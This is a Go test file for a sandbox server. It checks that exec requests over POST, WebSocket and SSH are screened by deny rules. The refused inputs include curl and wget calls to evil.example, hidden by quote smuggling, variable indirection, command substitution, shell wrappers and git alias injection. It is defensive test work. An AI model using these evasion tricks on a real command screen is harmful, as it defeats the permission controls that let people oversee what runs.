package server

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"strings"
	"testing"

	"github.com/zybuu-ai/abhed/controlplane"
	"github.com/zybuu-ai/abhed/driver"
	"github.com/zybuu-ai/abhed/wsconn"
)

// probeArgv runs curl through sh -c, with quotes in the words around it that
// a plain join of the words would pair up, hiding curl from the screen.
var probeArgv = []string{"env", "A='", "sh", "-c", "curl https://evil.example/x", "B='"}

// An argv exec is screened and recorded as the quoted line the driver runs,
// so a deny rule sees the words that run, on POST :exec and its WebSocket.
func TestSandboxExecScreensTheQuotedArgv(t *testing.T) {
	r := newWSRig(t, nil, nil, func(o *Options) { o.Config.Permissions.Deny = []string{"Bash(curl *)"} })
	sb := r.ready(t, "alice")
	body, _ := json.Marshal(controlplane.ExecRequest{Argv: probeArgv})
	rec := r.do(t, cpCall{method: "POST", path: "/v1/sandboxes/" + sb.ID + ":exec", token: "alice", body: string(body)})
	if rec.Code != http.StatusForbidden || errCode(t, rec) != "forbidden" {
		t.Fatalf("POST :exec: %d %s", rec.Code, rec.Body.String())
	}
	ev := waitAudit(t, r.cpRig, sb.ID, "exec", controlplane.OutcomeFailed)
	if want := r.svc.Redact(`env "A='" sh -c 'curl https://evil.example/x' "B='"`); ev.Detail["command"] != want {
		t.Fatalf("recorded %q, want %q", ev.Detail["command"], want)
	}
	ws, err := r.dial(t, "alice", "/v1/sandboxes/"+sb.ID+":exec", protoExec)
	if err != nil {
		t.Fatal(err)
	}
	_ = ws.WriteMessage(wsconn.Text, body)
	if c, _ := control(t, ws); c.Type != "error" || c.Error.Code != "forbidden" {
		t.Fatalf("WebSocket :exec %+v", c)
	}
	if r.fake.Calls("exec") != 0 {
		t.Fatal("a refused command ran")
	}
}

// A command line whose program or parts no rule can read, which a session
// would put to a person, is refused on :exec, where no one can confirm it:
// under the server's rules and a caller's policy layer alike, on POST, the
// WebSocket and SSH exec.
func TestSandboxExecRefusesWhatNoRuleCanRead(t *testing.T) {
	refused := []string{
		`sh -c 'c=wget; $c https://evil.example/x'`,
		`bash -c 'c=wget; $c https://evil.example/x'`,
		`sh -c '$(echo wget) https://evil.example/x'`,
		`sh -c -- 'c=wget; $c https://evil.example/x'`,
		`sh -c -x 'c=wget; $c https://evil.example/x'`,
		`sh -xc -- 'c=wget; $c https://evil.example/x'`,
		`busybox sh -c 'c=wget; $c https://evil.example/x'`,
		`su -c -- 'c=wget; $c https://evil.example/x'`,
		`find . -exec sh -c 'c=wget; $c https://evil.example/x' \;`,
		`c=curl; $c https://evil.example/x`,
		`c=git; $c push origin main`,
		`echo {$a,b}`,
		`git -c alias.x='!curl https://evil.example/x' x`,
		`git -c alias.x='!sh -c "curl https://evil.example/x"' x`,
		`git fetch-all https://evil.example/x`,
	}
	for name, mod := range map[string]func(*Options){
		"server rules": func(o *Options) {
			o.Config.Permissions.Deny = []string{"Bash(wget *)", "Bash(curl *)"}
			o.Config.Permissions.Ask = []string{"Bash(git push*)"}
		},
		"policy layer": func(o *Options) {
			o.SessionPolicy = func(context.Context, SessionPolicyRequest) (*PolicyLayer, error) {
				return &PolicyLayer{Name: "workspace pay", Deny: []string{"bash(wget *)", "bash(curl *)"}, Ask: []string{"bash(git push*)"}}, nil
			}
		},
	} {
		t.Run(name, func(t *testing.T) {
			r := newWSRig(t, nil, []driver.Capability{driver.CapAttach}, mod, func(o *Options) { o.SandboxSSHKey = testHostKey(t) })
			shellFake(r.cpRig)
			sb := r.ready(t, "alice")
			ssh := sshClient(t, r, sb.ID)
			for _, command := range refused {
				body, _ := json.Marshal(controlplane.ExecRequest{Command: command})
				rec := r.do(t, cpCall{method: "POST", path: "/v1/sandboxes/" + sb.ID + ":exec", token: "alice", body: string(body)})
				if rec.Code != http.StatusForbidden || errCode(t, rec) != "forbidden" || !strings.Contains(rec.Body.String(), "no one can confirm it on an exec") {
					t.Fatalf("POST :exec %s: %d %s", command, rec.Code, rec.Body.String())
				}
				ws, err := r.dial(t, "alice", "/v1/sandboxes/"+sb.ID+":exec", protoExec)
				if err != nil {
					t.Fatal(err)
				}
				_ = ws.WriteMessage(wsconn.Text, body)
				if c, _ := control(t, ws); c.Type != "error" || c.Error.Code != "forbidden" {
					t.Fatalf("WebSocket :exec %s: %+v", command, c)
				}
				_ = ws.Close()
				s, _ := ssh.NewSession()
				var errOut bytes.Buffer
				s.Stderr = &errOut
				if err := s.Run(command); err == nil || !strings.Contains(errOut.String(), "no one can confirm it on an exec") {
					t.Fatalf("SSH exec %s: %v %q", command, err, errOut.String())
				}
			}
			if n := r.fake.Calls("exec"); n != 0 {
				t.Fatalf("%d refused commands ran", n)
			}
			// What the rules can read and let through still runs, destructive or not.
			for i, command := range []string{"go test ./...", `"$HOME/bin/tool" --x`, "rm -rf build", "mkdir -p a/{b,c}"} {
				body, _ := json.Marshal(controlplane.ExecRequest{Command: command})
				rec := r.do(t, cpCall{method: "POST", path: "/v1/sandboxes/" + sb.ID + ":exec", token: "alice", body: string(body)})
				if rec.Code != http.StatusOK || r.fake.Calls("exec") != i+1 {
					t.Fatalf("%s: %d %s", command, rec.Code, rec.Body.String())
				}
			}
		})
	}
}

// A git extension opted in to with permissions.git_extensions runs on an
// exec; one that is not, or an alias the command line sets, is refused.
func TestSandboxExecGitExtensionsOptIn(t *testing.T) {
	r := newWSRig(t, nil, nil, func(o *Options) {
		o.Config.Permissions.Deny = []string{"Bash(curl *)"}
		o.Config.Permissions.GitExtensions = []string{"lfs"}
	})
	sb := r.ready(t, "alice")
	for command, want := range map[string]int{
		"git lfs pull":    http.StatusOK,
		"git annex get x": http.StatusForbidden,
		"git -c alias.lfs='!curl https://evil.example/x' lfs": http.StatusForbidden,
	} {
		body, _ := json.Marshal(controlplane.ExecRequest{Command: command})
		rec := r.do(t, cpCall{method: "POST", path: "/v1/sandboxes/" + sb.ID + ":exec", token: "alice", body: string(body)})
		if rec.Code != want {
			t.Fatalf("%s: %d %s", command, rec.Code, rec.Body.String())
		}
	}
}
